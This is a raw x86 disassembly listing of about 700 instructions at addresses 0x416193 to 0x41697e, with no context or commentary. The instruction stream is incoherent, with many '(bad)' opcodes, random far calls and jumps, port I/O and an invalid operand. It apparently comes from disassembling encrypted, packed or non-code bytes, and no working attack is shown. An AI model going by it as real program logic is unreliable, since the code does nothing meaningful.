  416193:	push   eax
  416194:	mov    DWORD PTR [eax-0x3b],esi
  416197:	pop    edi
  416198:	pop    ecx
  416199:	add    ebx,ebx
  41619b:	dec    esi
  41619c:	idiv   BYTE PTR [edx-0x28eae5f3]
  4161a2:	inc    ebx
  4161a3:	mov    esp,0x90afb4a0
  4161a8:	mov    esp,0x9a6b2ce7
  4161ad:	push   edi
  4161ae:	(bad)  
  4161af:	dec    esp
  4161b0:	mov    cl,0x3d
  4161b2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4161b4:	jno    0x4161a1
  4161b6:	ins    DWORD PTR es:[edi],dx
  4161b7:	sub    BYTE PTR [edi-0x6ca2630b],0xe4
  4161be:	call   0xdb916470
  4161c3:	imul   ebx,DWORD PTR [edi-0x5d],0x42
  4161c7:	xchg   ebx,eax
  4161c8:	cmc    
  4161c9:	ja     0x416200
  4161cb:	popf   
  4161cc:	sbb    DWORD PTR [ecx],esi
  4161ce:	jmp    0x4161d9
  4161d0:	or     ecx,ebp
  4161d2:	xchg   ecx,eax
  4161d3:	imul   ebp,DWORD PTR [edi+0x123d04e4],0x4
  4161da:	dec    ebp
  4161db:	(bad)  
  4161dc:	add    edi,DWORD PTR cs:[edi-0x4ed28418]
  4161e3:	inc    edx
  4161e4:	pop    ds
  4161e5:	repz add DWORD PTR [ecx-0x6b],eax
  4161e9:	push   ecx
  4161ea:	std    
  4161eb:	xchg   ecx,eax
  4161ec:	sbb    eax,0xb8c2af06
  4161f1:	or     ebx,DWORD PTR [edx]
  4161f3:	rcl    BYTE PTR [edi],1
  4161f5:	pop    edi
  4161f6:	push   cs
  4161f7:	ds retf 
  4161f9:	into   
  4161fa:	repnz mov al,0xf0
  4161fd:	int    0x8a
  4161ff:	arpl   cx,bp
  416201:	daa    
  416202:	test   DWORD PTR [esp+ebx*8],esi
  416205:	jns    0x416243
  416207:	pop    esi
  416208:	enter  0xeb18,0xd8
  41620c:	add    bh,BYTE PTR [ecx-0x2a]
  41620f:	ins    DWORD PTR es:[edi],dx
  416210:	ins    DWORD PTR es:[edi],dx
  416211:	jecxz  0x41622b
  416213:	imul   ebx,DWORD PTR [edi],0xe281eced
  416219:	jle    0xdb443652
  41621f:	and    DWORD PTR [ebx+esi*4+0x702aa697],0x6c
  416227:	retf   
  416228:	push   esp
  416229:	push   ecx
  41622a:	frstor [ebx]
  41622c:	retf   
  41622d:	pop    ds
  41622e:	jge    0x4161e3
  416230:	xlat   BYTE PTR ds:[ebx]
  416231:	in     eax,dx
  416232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416233:	push   eax
  416234:	pop    es
  416235:	scas   eax,DWORD PTR es:[edi]
  416236:	jmp    0x4fe5:0xb8542eb6
  41623d:	xchg   ebx,eax
  41623e:	dec    esi
  41623f:	mov    ebp,0xa013e4c7
  416244:	push   es
  416245:	or     al,0xb3
  416247:	enter  0xf165,0xbf
  41624b:	js     0x41622d
  41624d:	jmp    0x416212
  41624f:	adc    al,0xac
  416251:	sub    eax,0x41c76e82
  416256:	adc    DWORD PTR [edi],eax
  416258:	sub    eax,DWORD PTR ds:0x749c722e
  41625e:	(bad)  
  41625f:	mov    ebx,0x8ada79fd
  416264:	fistp  QWORD PTR ds:[eax+0x3]
  416268:	mov    ch,0x67
  41626a:	xchg   esp,eax
  41626b:	sahf   
  41626c:	add    dl,0x5e
  41626f:	push   edi
  416270:	or     dl,bh
  416272:	inc    ecx
  416273:	or     BYTE PTR [eax+0x5f],bl
  416276:	lods   al,BYTE PTR ds:[esi]
  416277:	jnp    0x416280
  416279:	push   eax
  41627a:	push   edx
  41627b:	mov    esi,0xe52bd65d
  416280:	add    BYTE PTR [edi+0x34],bh
  416283:	mov    al,0xd1
  416285:	retf   0x63dd
  416288:	js     0x416242
  41628a:	mov    edx,0x6e283e45
  41628f:	test   DWORD PTR [ecx],esi
  416291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416292:	mov    al,0x63
  416294:	std    
  416295:	cmc    
  416296:	ja     0x4162d1
  416298:	and    BYTE PTR [eax],al
  41629a:	es leave 
  41629c:	in     al,0x67
  41629e:	gs sub ch,cl
  4162a1:	call   0x907:0xc6290390
  4162a8:	sbb    al,BYTE PTR [edx]
  4162aa:	xchg   esi,eax
  4162ab:	in     al,0x83
  4162ad:	mov    ch,0xb2
  4162af:	mov    ecx,0x67412beb
  4162b4:	(bad)  
  4162b5:	int3   
  4162b6:	test   al,0x5e
  4162b8:	shr    DWORD PTR [ebp-0x260bbf65],cl
  4162be:	and    DWORD PTR [edi-0x29],ecx
  4162c1:	in     eax,0xfc
  4162c3:	sbb    al,0xae
  4162c5:	jl     0x416263
  4162c7:	sub    edx,DWORD PTR [ecx]
  4162c9:	jbe    0x416318
  4162cb:	call   0xdd02:0x72934d2e
  4162d2:	nop
  4162d3:	sbb    ch,ah
  4162d5:	cdq    
  4162d6:	add    ebp,edx
  4162d8:	je     0x41633c
  4162da:	xor    DWORD PTR [eax+0x7d],esp
  4162dd:	stos   DWORD PTR es:[edi],eax
  4162de:	push   esp
  4162df:	mov    ah,0x60
  4162e1:	cmc    
  4162e2:	imul   esi,ebp,0x12
  4162e5:	ins    DWORD PTR es:[edi],dx
  4162e6:	mov    dh,0x55
  4162e8:	push   0x7dc8077d
  4162ed:	les    ebx,FWORD PTR [edx]
  4162ef:	xor    eax,0xaa2c7745
  4162f4:	add    ah,BYTE PTR [eax+0x58]
  4162f7:	push   es
  4162f8:	mov    ds,ebx
  4162fa:	ds mov esp,eax
  4162fd:	cmp    edi,DWORD PTR [eax-0x3071415b]
  416303:	out    0x96,al
  416305:	loopne 0x416383
  416307:	bound  esi,QWORD PTR [edx]
  416309:	xchg   edx,eax
  41630a:	imul   ebx,edx,0xffffff82
  41630d:	(bad)  
  41630e:	mov    ds:0x34b650f6,eax
  416313:	adc    eax,0xe98e106d
  416318:	addr16 push edi
  41631a:	mov    al,0xdd
  41631c:	cdq    
  41631d:	inc    ebp
  41631e:	sub    BYTE PTR [edi-0x20196169],al
  416324:	xchg   BYTE PTR [ecx-0x5b2abf98],cl
  41632a:	test   DWORD PTR [edi],esi
  41632c:	ss fs adc eax,0xba845d01
  416333:	jae    0x41637e
  416335:	(bad)  
  416337:	pop    ss
  416338:	fsub   st(6),st
  41633a:	in     al,dx
  41633b:	adc    DWORD PTR [esi+edx*8+0x37e4b881],edi
  416342:	loope  0x4162ca
  416344:	push   ebp
  416345:	mov    ds:0xd375f867,al
  41634a:	popf   
  41634b:	xor    ecx,DWORD PTR [eax]
  41634d:	cmp    al,0x8
  41634f:	fdiv   QWORD PTR [ebx+0xfa4e265]
  416355:	and    al,0x1b
  416357:	stc    
  416358:	jo     0x416388
  41635a:	pushf  
  41635b:	jbe    0x416382
  41635d:	xchg   ebp,eax
  41635e:	xchg   edx,eax
  41635f:	dec    ebp
  416360:	add    DWORD PTR [eax],esp
  416362:	xlat   BYTE PTR ds:[ebx]
  416363:	addr16 jne 0x41633c
  416366:	(bad)  
  416367:	int3   
  416368:	cs and eax,0x3778e8c4
  41636e:	fwait
  41636f:	ins    BYTE PTR es:[edi],dx
  416370:	test   BYTE PTR [ebx+0x25],bh
  416373:	pop    ecx
  416374:	jne    0x41637c
  416376:	pop    esi
  416377:	cwde   
  416378:	ins    BYTE PTR es:[edi],dx
  416379:	and    al,0x78
  41637b:	xor    ch,BYTE PTR ds:0x3470d406
  416381:	pushaw 
  416383:	(bad)  
  416384:	in     eax,0xa4
  416386:	test   BYTE PTR [ecx-0x30021351],0xfa
  41638d:	inc    edx
  41638e:	test   cl,cl
  416390:	ss push ecx
  416392:	fdivr  DWORD PTR [ecx-0x10c1740f]
  416398:	and    eax,0xc943c940
  41639d:	xor    al,0x1a
  41639f:	pop    ss
  4163a0:	fisubr WORD PTR cs:[ebp+0x42c0a07f]
  4163a7:	pop    ss
  4163a8:	xchg   edi,eax
  4163a9:	push   ds
  4163aa:	into   
  4163ab:	xchg   ebp,eax
  4163ac:	mov    esp,0x21f89c40
  4163b1:	out    0xf5,eax
  4163b3:	fwait
  4163b4:	lahf   
  4163b5:	mov    es,WORD PTR [ecx+eiz*4+0x176389f1]
  4163bc:	imul   ebp,DWORD PTR [edi+0x57121b15],0x62
  4163c3:	in     eax,dx
  4163c4:	scas   al,BYTE PTR es:[edi]
  4163c5:	iret   
  4163c6:	test   bh,0x7d
  4163c9:	fsubr  st(6),st
  4163cb:	out    dx,eax
  4163cc:	rol    DWORD PTR [edi+ebx*1-0x7f16ef0],cl
  4163d3:	mov    bl,0xf1
  4163d5:	ins    DWORD PTR es:[edi],dx
  4163d6:	mov    ah,0x9c
  4163d8:	dec    esi
  4163d9:	xor    al,0x42
  4163db:	jbe    0x41642f
  4163dd:	popf   
  4163de:	hlt    
  4163df:	pop    ebp
  4163e0:	pushf  
  4163e1:	sbb    bl,BYTE PTR gs:[edi-0x4c]
  4163e5:	and    BYTE PTR [bx+di+0x7],dh
  4163e9:	mov    edi,0x49a6dd48
  4163ee:	es cld 
  4163f0:	retf   0x7236
  4163f3:	mov    WORD PTR fs:[ebx+edx*8-0x3c],ss
  4163f8:	xchg   esp,eax
  4163f9:	xchg   ebp,eax
  4163fa:	pop    ebp
  4163fb:	and    edx,DWORD PTR [ecx]
  4163fd:	ror    BYTE PTR [edi],0x76
  416400:	retf   
  416401:	aaa    
  416402:	nop
  416403:	cdq    
  416404:	cs lahf 
  416406:	inc    ecx
  416407:	mov    al,ds:0x57746310
  41640c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41640d:	jmp    0x41641c
  41640f:	test   DWORD PTR [edx],ebp
  416411:	add    eax,DWORD PTR [edi]
  416413:	gs jle 0x41641d
  416416:	pop    ebp
  416417:	mov    ds:0x299e47ad,eax
  41641c:	mov    esi,DWORD PTR [edx+0x1e5c1974]
  416422:	adc    DWORD PTR [esi-0x234b3466],ebx
  416428:	stos   DWORD PTR es:[edi],eax
  416429:	and    BYTE PTR [ecx+0x9],0xb7
  41642d:	and    eax,0xb6a36fa
  416432:	mov    al,ds:0x906e9111
  416437:	out    dx,eax
  416438:	je     0x41649c
  41643a:	stos   BYTE PTR es:[edi],al
  41643b:	hlt    
  41643c:	loope  0x4163e9
  41643e:	mov    dl,0xeb
  416440:	outs   dx,BYTE PTR ds:[esi]
  416441:	repnz dec esi
  416443:	push   esp
  416444:	xchg   ebp,eax
  416445:	mov    edi,cs
  416447:	or     BYTE PTR ds:0x425d59b1,ah
  41644d:	aas    
  41644e:	push   0xf947d0d7
  416453:	iret   
  416454:	add    eax,0x13cb9f20
  416459:	sub    edi,edx
  41645b:	ja     0x41643b
  41645d:	mov    fs,WORD PTR [edx+0x8849702]
  416463:	xchg   DWORD PTR [ebp+0x6c0232a7],edx
  416469:	push   es
  41646a:	mov    dl,0x76
  41646c:	push   0x48
  41646e:	test   al,0x3d
  416470:	adc    esp,DWORD PTR [ecx]
  416472:	not    ah
  416474:	sub    eax,0xfbb997dd
  416479:	addr16 cs retf 
  41647c:	push   ebp
  41647d:	not    DWORD PTR [ebp+0x19b4d467]
  416483:	js     0x4164ea
  416485:	inc    ecx
  416486:	inc    ecx
  416487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416488:	mov    ebx,0x64d86358
  41648d:	pop    edx
  41648e:	and    BYTE PTR [ebp+0x4c],ah
  416491:	or     edx,edi
  416493:	add    edi,DWORD PTR [ebp-0x76]
  416496:	or     al,0xa5
  416498:	inc    esi
  416499:	jecxz  0x416454
  41649b:	add    DWORD PTR [eax+0x5ef09095],0x4bdae296
  4164a5:	lds    ebp,FWORD PTR [eax+0x31a88ad5]
  4164ab:	or     dh,ch
  4164ad:	push   esp
  4164ae:	sti    
  4164af:	in     eax,0xd5
  4164b1:	mov    esp,0x723ca97d
  4164b6:	mov    ch,0x33
  4164b8:	shl    eax,cl
  4164ba:	or     ecx,DWORD PTR [esi-0xd9cc7fd]
  4164c0:	pop    es
  4164c1:	clc    
  4164c2:	push   esi
  4164c3:	cwde   
  4164c4:	jl     0x416470
  4164c6:	sub    al,0x88
  4164c8:	mov    edx,DWORD PTR [esi+0x17]
  4164cb:	enter  0x5c33,0x65
  4164cf:	aad    0x35
  4164d1:	out    dx,al
  4164d2:	fmul   st(0),st
  4164d4:	call   0x7036:0xbab7b5e
  4164db:	or     al,0x18
  4164dd:	inc    ebx
  4164de:	jbe    0x41648c
  4164e0:	cmp    eax,0xe8d1767c
  4164e5:	call   0xe3fb885d
  4164ea:	push   0x8956e5b5
  4164ef:	and    eax,0x6d7483a8
  4164f4:	arpl   cx,sp
  4164f6:	test   BYTE PTR [edi],cl
  4164f8:	inc    ebx
  4164f9:	cli    
  4164fa:	js     0x4164c2
  4164fc:	leave  
  4164fd:	push   es
  4164fe:	mov    ah,0x95
  416500:	lea    esi,[esi+0x5e909114]
  416506:	pushf  
  416507:	ds js  0x416576
  41650a:	push   ecx
  41650b:	out    0xf1,al
  41650d:	adc    BYTE PTR [ecx],0xfb
  416510:	fimul  DWORD PTR [edx+0x30]
  416513:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416514:	mov    ebx,0xa12282fb
  416519:	or     eax,DWORD PTR [ecx+0xa8866a8]
  41651f:	pop    ds
  416520:	sub    eax,0x206394c
  416525:	cmovno edi,DWORD PTR ds:0x6f6dafb
  41652c:	sbb    eax,0xaade0af
  416531:	popf   
  416532:	push   ebp
  416533:	jno    0x416581
  416535:	push   eax
  416536:	in     eax,0xff
  416538:	sbb    ebp,ebp
  41653a:	jne    0x416554
  41653c:	mov    ecx,0x7b57ae39
  416541:	rol    BYTE PTR [ecx-0x3],0x98
  416545:	loopne 0x416595
  416547:	and    edx,0xffffffeb
  41654a:	ret    0xbfc6
  41654d:	inc    esp
  41654e:	imul   eax,DWORD PTR [esi+0x13],0x76a7fce1
  416555:	shl    BYTE PTR [edi],0xb2
  416558:	test   al,0xe0
  41655a:	test   BYTE PTR [edi-0x36],0xe9
  41655e:	mov    edx,ebp
  416560:	nop
  416561:	out    0x65,eax
  416563:	out    dx,eax
  416564:	push   ebp
  416565:	jmp    0x2e9606a6
  41656a:	sbb    BYTE PTR [ebp-0x27],dl
  41656d:	jo     0x416528
  41656f:	fs in  al,dx
  416571:	fcmove st,st(7)
  416573:	adc    BYTE PTR ds:0x1084926e,bh
  416579:	cwde   
  41657a:	pushf  
  41657b:	adc    eax,0xaab3fc33
  416580:	(bad)  
  416581:	fstp   DWORD PTR [edx]
  416583:	pop    ecx
  416584:	and    ecx,DWORD PTR [edx+0x5e]
  416587:	xor    al,BYTE PTR [ebp+0x35ddd2a5]
  41658d:	lods   eax,DWORD PTR ds:[esi]
  41658e:	push   esp
  41658f:	xor    BYTE PTR [ecx],dh
  416591:	mov    ebp,0x47568703
  416596:	mov    bh,0xd1
  416598:	gs push ds
  41659a:	outs   dx,DWORD PTR ds:[esi]
  41659b:	xchg   DWORD PTR [ebp-0x29afe879],eax
  4165a1:	mov    al,0x6c
  4165a3:	push   eax
  4165a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165a5:	xor    BYTE PTR [eax],ch
  4165a7:	add    cl,BYTE PTR [eax]
  4165a9:	jns    0x4165a7
  4165ab:	mov    dh,0x48
  4165ad:	dec    eax
  4165ae:	push   esp
  4165af:	mov    cl,0x1c
  4165b1:	ret    0x9243
  4165b4:	mov    ebp,0x9df9c523
  4165b9:	std    
  4165ba:	adc    al,0x7c
  4165bc:	xor    DWORD PTR [ebx+0x1b],esi
  4165bf:	add    BYTE PTR [ecx],bl
  4165c1:	call   0xba15:0x14607a3f
  4165c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165c9:	xor    DWORD PTR [edi],ebp
  4165cb:	sub    edx,esi
  4165cd:	or     eax,edi
  4165cf:	jg     0x416566
  4165d1:	int3   
  4165d2:	fbld   TBYTE PTR [ebx+0x2d]
  4165d5:	jg     0x4165dd
  4165d7:	pop    esp
  4165d8:	sub    DWORD PTR [ecx+esi*4+0x5aca0eba],edi
  4165df:	popf   
  4165e0:	add    al,0x34
  4165e2:	mov    es,edi
  4165e4:	push   0x57
  4165e6:	frstpm(287 only) 
  4165e8:	jmp    0x2975:0x54afb8b3
  4165ef:	(bad)  
  4165f0:	jns    0x416659
  4165f2:	aas    
  4165f3:	push   ebx
  4165f4:	int3   
  4165f5:	add    eax,0x3f17d2f7
  4165fa:	cmp    al,BYTE PTR [ecx+edx*8-0x14042b78]
  416601:	repnz imul esi,DWORD PTR [ebx-0x60ae8de1],0xfffffffa
  416609:	aam    0xe9
  41660b:	jno    0x416678
  41660d:	iret   
  41660e:	push   ebx
  41660f:	jge    0x416638
  416611:	add    cl,BYTE PTR [ecx+0x5f785da4]
  416617:	push   0xffffffc8
  416619:	sbb    esp,ebp
  41661b:	mov    ds,WORD PTR [ecx-0xc]
  41661e:	rcr    DWORD PTR [esi],cl
  416620:	fisubr DWORD PTR [eax-0x71]
  416623:	mov    bl,0xeb
  416625:	dec    edx
  416626:	mov    al,0xc1
  416628:	mov    al,0xa9
  41662a:	pop    ecx
  41662b:	mov    al,ds:0x2880db2
  416630:	inc    ecx
  416631:	fsub   QWORD PTR [ebp-0x1d]
  416634:	inc    edx
  416635:	outs   dx,DWORD PTR ds:[esi]
  416636:	sbb    ecx,DWORD PTR [ecx+0x79]
  416639:	mov    ds,WORD PTR [ecx-0x306db59e]
  41663f:	fsubr  DWORD PTR [eax]
  416641:	call   0xd7d8a375
  416646:	fdiv   DWORD PTR [edx*1-0x4b7c87f6]
  41664d:	add    DWORD PTR [ecx+0x151a2a10],edi
  416653:	mov    edi,DWORD PTR [esi+eiz*4-0x29]
  416657:	pop    edx
  416658:	xlat   BYTE PTR ds:[ebx]
  416659:	arpl   WORD PTR [edx],bx
  41665b:	test   BYTE PTR [ecx+ecx*2],dh
  41665e:	adc    bl,dl
  416660:	dec    esp
  416661:	sahf   
  416662:	bound  ebx,QWORD PTR [edi+0x4d7d0156]
  416668:	xchg   ebx,eax
  416669:	mov    edi,ebx
  41666b:	xchg   esp,eax
  41666c:	cs stc 
  41666e:	add    BYTE PTR [eax],bl
  416670:	jmp    0x76ac:0x682335e0
  416677:	xchg   ebx,eax
  416678:	push   edx
  416679:	mov    eax,0xcac1a89c
  41667e:	out    0xad,eax
  416680:	sbb    ah,BYTE PTR [eax-0x71dd83f6]
  416686:	sub    dh,BYTE PTR [eax-0x6c]
  416689:	adc    BYTE PTR [esi-0x1e],ch
  41668c:	fwait
  41668d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41668e:	push   esi
  41668f:	pop    eax
  416690:	in     al,dx
  416691:	and    edi,DWORD PTR [esi]
  416693:	pop    esi
  416694:	mov    ds:0x1be575fb,al
  416699:	cwde   
  41669a:	cmp    DWORD PTR [ecx-0x7979ce5d],esp
  4166a0:	js     0x41667a
  4166a2:	jnp    0x4166b5
  4166a4:	inc    ecx
  4166a5:	scas   al,BYTE PTR es:[edi]
  4166a6:	sbb    BYTE PTR [ecx],ch
  4166a8:	pop    es
  4166a9:	jns    0x4166f1
  4166ab:	leave  
  4166ac:	push   ebx
  4166ad:	and    BYTE PTR [ebx-0x3a],ch
  4166b0:	pop    ds
  4166b1:	mov    esp,0xcc94da68
  4166b6:	in     al,dx
  4166b7:	dec    ebp
  4166b8:	in     eax,0x34
  4166ba:	adc    al,ah
  4166bc:	sbb    eax,ebx
  4166be:	iret   
  4166bf:	jg     0x41673e
  4166c1:	xor    ch,ch
  4166c3:	mov    ah,0x23
  4166c5:	test   al,0x24
  4166c7:	aaa    
  4166c8:	outs   dx,DWORD PTR ds:[esi]
  4166c9:	add    eax,0x270a67f4
  4166ce:	fdivrp st(1),st
  4166d0:	pop    esi
  4166d1:	in     al,0xf9
  4166d3:	in     al,0xff
  4166d5:	enter  0x9e10,0xef
  4166d9:	or     eax,0x8a053391
  4166de:	jle    0x4166bf
  4166e0:	loop   0x416747
  4166e2:	stc    
  4166e3:	shr    cl,1
  4166e5:	or     ebp,DWORD PTR [edx+0x18]
  4166e8:	adc    eax,0x3f8346b9
  4166ed:	js     0x416750
  4166ef:	or     ch,BYTE PTR [esi-0x1820b3e5]
  4166f5:	mov    al,ds:0x25949f17
  4166fa:	aaa    
  4166fb:	pusha  
  4166fc:	repz fnstcw WORD PTR [ebp-0x1fbcb3cd]
  416703:	sub    ah,BYTE PTR [edx]
  416705:	xchg   edi,eax
  416706:	xlat   BYTE PTR ds:[ebx]
  416707:	add    BYTE PTR [edx],ch
  416709:	pop    ecx
  41670a:	or     bl,BYTE PTR [edx+0x11843e44]
  416710:	sbb    bl,BYTE PTR [ebx]
  416712:	jmp    0x416736
  416714:	mov    ds:0x55ac493a,eax
  416719:	pop    ss
  41671a:	call   0xe86f:0x83d479ad
  416721:	add    ebx,DWORD PTR [ebx]
  416723:	imul   edi,DWORD PTR [edx+0x3b5b08bd],0x5bf7615a
  41672d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41672e:	push   ss
  41672f:	mov    eax,0x2d39c7ea
  416734:	frstor [ecx+0x69b5efd2]
  41673a:	pusha  
  41673b:	push   esi
  41673c:	ins    DWORD PTR es:[edi],dx
  41673d:	int3   
  41673e:	xor    ebp,ebp
  416740:	sub    eax,0x760b42d0
  416745:	jns    0x41677e
  416747:	mov    BYTE PTR [esi-0x16],al
  41674a:	neg    ebx
  41674c:	add    eax,0xeedf7cda
  416751:	stc    
  416752:	adc    ah,ch
  416754:	bound  esi,QWORD PTR [ebx-0x31aa1cba]
  41675a:	push   eax
  41675b:	xor    BYTE PTR [ebp-0x12],dh
  41675e:	fidivr DWORD PTR ds:0xf1657f80
  416764:	mov    bh,0x1d
  416766:	adc    eax,DWORD PTR [ecx]
  416768:	or     bl,cl
  41676a:	stos   DWORD PTR es:[edi],eax
  41676b:	adc    dl,cl
  41676d:	in     eax,0xf0
  41676f:	aad    0x83
  416771:	mov    ebx,0xeea31ab2
  416776:	ret    0x4ccf
  416779:	adc    bh,dh
  41677b:	add    DWORD PTR [esi+esi*2],esp
  41677e:	test   eax,0xc549d427
  416783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416784:	cmp    DWORD PTR [ebp+0x17],0xffffff85
  416788:	cmp    BYTE PTR [edx+0x3b],ch
  41678b:	bound  edi,QWORD PTR [ecx+0x65]
  41678e:	enter  0x8e1a,0xe0
  416792:	and    BYTE PTR [eax-0x7e],0x9e
  416796:	and    cl,BYTE PTR [eax+0x2c]
  416799:	fnsave ds:0x1f204fe8
  41679f:	icebp  
  4167a0:	les    ebx,FWORD PTR [eax-0xe]
  4167a3:	into   
  4167a4:	ds (bad) 
  4167a6:	and    DWORD PTR [edx+0x4b],edx
  4167a9:	int    0x47
  4167ab:	retf   
  4167ac:	add    edx,edi
  4167ae:	pop    DWORD PTR [edi+0x4c]
  4167b1:	add    eax,0x72c9f79c
  4167b6:	ss pusha 
  4167b8:	and    DWORD PTR [ebx+0x43],ebp
  4167bb:	outs   dx,BYTE PTR ds:[esi]
  4167bc:	xchg   esp,eax
  4167bd:	fnstcw WORD PTR [ebx]
  4167bf:	arpl   si,cx
  4167c1:	inc    esp
  4167c2:	in     eax,dx
  4167c3:	clc    
  4167c4:	inc    ecx
  4167c5:	mov    ds:0x54b81480,eax
  4167ca:	cdq    
  4167cb:	ret    
  4167cc:	lods   eax,DWORD PTR ds:[esi]
  4167cd:	enter  0x8ad1,0x60
  4167d1:	lahf   
  4167d2:	pop    ss
  4167d3:	push   ebp
  4167d4:	retf   
  4167d5:	or     al,0xa4
  4167d7:	imul   BYTE PTR [eax+0x5c]
  4167da:	aad    0xab
  4167dc:	fild   QWORD PTR [eax+0x2b52121d]
  4167e2:	xchg   esi,eax
  4167e3:	inc    eax
  4167e4:	imul   esi,ebx,0xffffffc2
  4167e7:	cmp    eax,0xe4aff048
  4167ec:	lock clc 
  4167ee:	sub    al,0x3
  4167f0:	and    edx,DWORD PTR [esi]
  4167f2:	mov    edx,0x8eb68c38
  4167f7:	jno    0x41682e
  4167f9:	lds    edx,FWORD PTR [edx]
  4167fb:	and    edi,esi
  4167fd:	dec    edx
  4167fe:	add    eax,0xaee5d3d0
  416803:	push   cs
  416804:	push   0xffffffd6
  416806:	scas   al,BYTE PTR es:[edi]
  416807:	lahf   
  416808:	ret    0xea4d
  41680b:	stos   DWORD PTR es:[edi],eax
  41680c:	xor    al,BYTE PTR ds:0xf1e82d28
  416812:	mov    esi,DWORD PTR [ecx+0x78dea8ff]
  416818:	push   ds
  416819:	cld    
  41681a:	lock pop eax
  41681c:	dec    ebx
  41681d:	and    DWORD PTR [edi-0x52],esp
  416820:	(bad)  
  416821:	sub    ecx,DWORD PTR [ebp+eiz*4+0xfc803ad]
  416828:	push   esp
  416829:	jmp    FWORD PTR [esi-0x6e773082]
  41682f:	jno    0x4167f8
  416831:	jmp    DWORD PTR [ebx+0x2e8be79b]
  416837:	lods   eax,DWORD PTR ds:[esi]
  416838:	js     0x41687d
  41683a:	push   eax
  41683b:	push   cs
  41683c:	mov    al,ds:0x9fac7786
  416841:	call   0x1904:0xa0ea435b
  416848:	or     al,BYTE PTR [ebp+0x117fd603]
  41684e:	push   ss
  41684f:	pop    edi
  416850:	push   ds
  416851:	in     al,dx
  416852:	cld    
  416853:	mov    DWORD PTR [ebp+ebp*1-0x47],edi
  416857:	jo     0x416891
  416859:	push   cs
  41685a:	es mov dl,0xc0
  41685d:	push   ebx
  41685e:	dec    esp
  41685f:	and    BYTE PTR [ecx-0x72],bl
  416862:	jge    0x41680c
  416864:	dec    esp
  416865:	jle    0x4167ea
  416867:	ret    0x8483
  41686a:	cmp    dl,bh
  41686c:	push   0xffffffe1
  41686e:	in     eax,0x8a
  416870:	icebp  
  416871:	lahf   
  416872:	(bad)
  416875:	sbb    DWORD PTR [edi+0x2a],esi
  416878:	lea    eax,[esi+0x57]
  41687b:	ds push 0xffffff82
  41687e:	mov    ds:0xdbfc3fc8,eax
  416883:	mov    ecx,0x6788f6a0
  416888:	imul   esi,DWORD PTR [edi-0x37],0x24
  41688c:	or     ecx,DWORD PTR ds:0x712162cc
  416892:	mov    eax,0x46b65fe1
  416897:	push   ds
  416898:	cmp    bl,bh
  41689a:	and    al,0xcf
  41689c:	fcomp  DWORD PTR [ebx+0x1b]
  41689f:	pop    ss
  4168a0:	dec    edx
  4168a1:	shl    BYTE PTR [eax-0x4],0xa2
  4168a5:	loope  0x416862
  4168a7:	mov    ds:0xbb5a4e8a,eax
  4168ac:	sar    bh,0xba
  4168af:	sbb    edx,DWORD PTR [edx]
  4168b1:	pushf  
  4168b2:	mov    edx,0xde03b662
  4168b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b8:	xchg   ecx,eax
  4168b9:	push   ds
  4168ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168bb:	xchg   edi,eax
  4168bc:	call   0x18cd:0x372b69bf
  4168c3:	add    eax,DWORD PTR [edx]
  4168c5:	xchg   DWORD PTR [ebx-0x1851f4ac],eax
  4168cb:	imul   ebx,DWORD PTR [ebp+0x1d95e5b9],0x2c51e288
  4168d5:	adc    BYTE PTR [ecx-0x79d409c5],al
  4168db:	inc    edx
  4168dc:	loope  0x416919
  4168de:	test   al,0xf8
  4168e0:	scas   al,BYTE PTR es:[edi]
  4168e1:	neg    BYTE PTR [eax]
  4168e3:	pop    esp
  4168e4:	cli    
  4168e5:	lods   al,BYTE PTR ds:[esi]
  4168e6:	test   eax,0x58959732
  4168eb:	xchg   edi,eax
  4168ec:	mov    ah,0x88
  4168ee:	xchg   edi,edx
  4168f0:	imul   edx,ecx,0x6adfc89f
  4168f6:	cmp    BYTE PTR [esi],cl
  4168f8:	sbb    eax,0x1e04901d
  4168fd:	pop    ss
  4168fe:	sub    ch,al
  416900:	xchg   edx,eax
  416901:	fwait
  416902:	shl    BYTE PTR [edi+edi*8-0x1c],0x0
  416907:	mov    ?,WORD PTR [ebp-0x2c]
  41690a:	in     al,dx
  41690b:	jbe    0x41697c
  41690d:	xor    DWORD PTR [ebp-0x5f618d59],ebp
  416913:	jae    0x4168fe
  416915:	push   edi
  416916:	inc    eax
  416917:	rcl    DWORD PTR [ebx-0x36],1
  41691a:	and    bl,bl
  41691c:	xor    eax,0xb8c94c41
  416921:	leave  
  416922:	mov    al,ds:0x59c4080a
  416927:	xor    BYTE PTR [ebp+0x74],al
  41692a:	sub    DWORD PTR [ecx+0x53a5ad62],esi
  416930:	inc    DWORD PTR [ecx*4-0x60f2c267]
  416937:	mov    bh,0xa1
  416939:	xor    ch,BYTE PTR [eax+ecx*1-0x66]
  41693d:	mov    al,ds:0x20ca5f44
  416942:	and    ch,BYTE PTR [edi-0x5f]
  416945:	pop    ss
  416946:	int    0xcb
  416948:	xor    ebp,DWORD PTR [edx]
  41694a:	lods   eax,DWORD PTR ds:[esi]
  41694b:	(bad)  [ebx-0x38]
  41694e:	xchg   dh,ah
  416950:	loop   0x4169ae
  416952:	in     eax,0xf1
  416954:	mov    ah,0xc0
  416956:	in     eax,dx
  416957:	xchg   edi,eax
  416958:	add    al,0x48
  41695a:	std    
  41695b:	xor    DWORD PTR [ebx],0xb26efbbb
  416961:	mov    eax,0xf1cd9af5
  416966:	dec    eax
  416967:	push   ebp
  416968:	inc    ecx
  416969:	mov    bl,BYTE PTR [ecx-0x3c]
  41696c:	je     0x41698e
  41696e:	in     al,0x86
  416970:	fs retf 0x6169
  416974:	mov    al,ds:0xea47249c
  416979:	aaa    
  41697a:	hlt    
  41697b:	xchg   BYTE PTR [esi],cl
  41697d:	pop    es
  41697e:	loop   0x4169fa
